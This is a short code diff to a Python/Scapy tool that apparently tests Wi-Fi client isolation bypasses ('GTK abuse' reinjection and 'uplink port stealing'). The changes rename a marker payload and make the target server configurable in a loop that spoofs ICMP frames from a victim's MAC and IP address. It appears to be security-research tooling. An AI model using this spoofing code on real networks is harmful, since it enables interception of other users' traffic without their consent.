@@ -191,6 +191,7 @@ class Monitor(Daemon):
 
 			self.time_tick()
 			curr_time = time.time()
+
 	def is_target_frame(self, p):
 		if not p.haslayer(Dot11) or not p.haslayer(Dot11CCMP):
 			return False  # Ensure it's an 802.11 frame with CCMP encryption
@@ -1020,7 +1021,7 @@ class Client2Client:
 	    log(STATUS, f">>> Reinject via GTK abuse successful. frame seq: {(bytes(eth[UDP].payload)[8:12]).hex()}", color="red")
 
 	def monitor_eth_port_steal_uplink(self, eth):
-		if ICMP in eth and eth[ICMP].type == 8 and eth[Raw].load == b"abcdefghijklmn" :
+		if ICMP in eth and eth[ICMP].type == 8 and eth[Raw].load == b"uplink_steal_test" :
 			log(STATUS, f">>> Uplink port stealing is successful.", color="red")
 
 	def send_c2c_frame(self):
@@ -1187,8 +1188,8 @@ class Client2Client:
 
 		if not self.options.measure:
 			for _ in range(500000):
-				ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
-				p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"abcdefghijklmn")
+				ip = IP(src=self.sup_victim.clientip, dst=self.options.server)/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
+				p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"uplink_steal_test")
 				#log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 				self.sup_victim.send_eth(p)
 				time.sleep(0.02)
